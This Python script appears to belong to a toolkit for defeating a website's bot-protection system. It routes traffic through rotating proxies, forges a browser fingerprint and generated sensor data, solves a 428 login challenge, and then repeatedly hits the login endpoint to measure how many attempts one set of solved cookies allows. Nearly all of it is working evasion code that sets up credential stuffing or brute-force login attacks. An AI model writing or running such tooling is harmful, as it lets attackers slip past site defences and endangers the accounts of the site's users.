"""
Test how many login requests can be made with the same solved cookies.
Solves once, then hammers the login endpoint with different payloads.
"""
import json
import os
import random
import sys
import time
import tempfile

import fpgen

os.environ.setdefault("SOLVER", "jsdom")

from solver_jsdom import (
    BASE_URL, LOGIN_URL, SENSOR_URL, SENSOR_PATH,
    SCRIPT_DIR, JSDOM_GEN, PROXY_TEMPLATE,
    _log, _make_proxy, _generate_fingerprint, _generate_sensors,
    _create_session, _get_trust, _get_sec_cpt, _login_headers,
    CurlSession, LkSession, HTTP_CLIENT,
)


def solve_and_reuse(email, password, max_logins=20):
    proxy_url, proxy_sid = _make_proxy()
    _log(f"Proxy: {proxy_sid}")

    fp = _generate_fingerprint()
    ua = fp["navigator"]["userAgent"]
    chrome_ver = fp["client"]["browser"]["version"]
    chrome_major = int(chrome_ver.split(".")[0])
    sec_ch_ua = fp["headers"].get("sec-ch-ua", [""])[0]
    _log(f"Fingerprint: Chrome/{chrome_ver}")

    fp_file = tempfile.NamedTemporaryFile(
        mode="w", suffix=".json", delete=False, dir=SCRIPT_DIR
    )
    json.dump(fp, fp_file, default=str)
    fp_file.close()
    fp_path = fp_file.name

    sess = _create_session(proxy_url, chrome_major)

    base_headers = {
        "User-Agent": ua,
        "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        "sec-ch-ua": sec_ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }
    sensor_headers = {
        "Accept": "*/*",
        "Content-Type": "text/plain;charset=UTF-8",
        "Origin": BASE_URL,
        "Referer": LOGIN_URL,
        **base_headers,
    }

    # Step 1: Load page + get cookies
    _log("GET login page...")
    r = sess.get(LOGIN_URL, headers=base_headers)
    _log(f"Page OK, trust={_get_trust(sess)}")

    # Step 2: Get sensor script
    r_js = sess.get(f"{BASE_URL}{SENSOR_PATH}", headers=base_headers)
    script_file = tempfile.NamedTemporaryFile(
        mode="w", suffix=".js", delete=False, dir=SCRIPT_DIR
    )
    script_file.write(r_js.text)
    script_file.close()
    script_path = script_file.name

    # Step 3: Generate and send sensors
    cookies_dict = sess.cookies_dict()
    sensor_bodies = _generate_sensors(cookies_dict, script_path, fp_path)
    _log(f"Generated {len(sensor_bodies)} sensors")

    for i, body in enumerate(sensor_bodies):
        r_s = sess.post(SENSOR_URL, data=body.encode("utf-8"), headers=sensor_headers)
        _log(f"POST #{i+1}/{len(sensor_bodies)}: {r_s.status_code}, trust={_get_trust(sess)}")
        if _get_trust(sess) == "0":
            break
        time.sleep(0.1)

    # Step 4: First login to trigger 428
    csrf = sess.get_cookie("_csrf")
    login_h = _login_headers(ua, csrf, sec_ch_ua)

    _log("Login POST...")
    r_login = sess.post(
        f"{BASE_URL}/login",
        json_data={"email": email, "password": password, "keepLoggedIn": False},
        headers=login_h,
    )
    _log(f"Status: {r_login.status_code}, trust={_get_trust(sess)}")

    if r_login.status_code == 428:
        challenge = r_login.json()
        chlge_url = challenge.get("chlge_content_url", "")
        verify_url = challenge.get("verify_url", "")
        _log(f"428 challenge, sec_cpt={_get_sec_cpt(sess)}")

        sess.get(f"{BASE_URL}{chlge_url}", headers={**base_headers, "Referer": LOGIN_URL})

        cookies_dict = sess.cookies_dict()
        chlge_bodies = _generate_sensors(cookies_dict, script_path, fp_path)
        for j, body in enumerate(chlge_bodies):
            r_c = sess.post(SENSOR_URL, data=body.encode("utf-8"), headers=sensor_headers)
            sec = _get_sec_cpt(sess)
            _log(f"Challenge post #{j+1}: {r_c.status_code}, sec_cpt={sec}")
            if sec == "2":
                break
            time.sleep(0.1)

        if verify_url:
            r_v = sess.post(
                f"{BASE_URL}/{verify_url}",
                data=json.dumps({"sensor_data": ""}).encode("utf-8"),
                headers={
                    "Accept": "*/*",
                    "Content-Type": "text/plain;charset=UTF-8",
                    "Origin": BASE_URL,
                    "Referer": f"{BASE_URL}{chlge_url}",
                    **base_headers,
                },
            )
            _log(f"Verify: {r_v.status_code}, sec_cpt={_get_sec_cpt(sess)}")

        time.sleep(2)

    # Step 5: Now test cookie reuse — hammer login with same cookies
    _log(f"\n{'='*60}")
    _log(f"COOKIE REUSE TEST — {max_logins} login attempts")
    _log(f"trust={_get_trust(sess)}, sec_cpt={_get_sec_cpt(sess)}")
    _log(f"{'='*60}")

    results = []
    for i in range(max_logins):
        csrf = sess.get_cookie("_csrf") or csrf
        login_h = _login_headers(ua, csrf, sec_ch_ua)

        fake_email = f"test{i}@test{i}.com"
        r_try = sess.post(
            f"{BASE_URL}/login",
            json_data={"email": fake_email, "password": "wrongpass123", "keepLoggedIn": False},
            headers=login_h,
        )
        trust = _get_trust(sess)
        sec_cpt = _get_sec_cpt(sess)
        results.append(r_try.status_code)
        _log(f"  Login #{i+1}: {r_try.status_code} trust={trust} sec_cpt={sec_cpt}")

        if r_try.status_code not in (200, 401):
            _log(f"  Body: {r_try.text[:200]}")
            if r_try.status_code == 428:
                _log("  Got 428 — cookie expired, stopping")
                break
            if r_try.status_code == 403:
                _log("  Got 403 — blocked, stopping")
                break

        time.sleep(0.5)

    # Summary
    n_401 = results.count(401)
    n_428 = results.count(428)
    n_403 = results.count(403)
    n_200 = results.count(200)
    _log(f"\nSummary: {len(results)} attempts, {n_401} x 401, {n_428} x 428, {n_403} x 403, {n_200} x 200")

    # Cleanup
    try:
        os.unlink(fp_path)
        os.unlink(script_path)
    except OSError:
        pass


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python test_cookie_reuse.py <email> <password> [max_logins]")
        sys.exit(1)

    email = sys.argv[1]
    password = sys.argv[2]
    max_logins = int(sys.argv[3]) if len(sys.argv) > 3 else 20

    solve_and_reuse(email, password, max_logins)
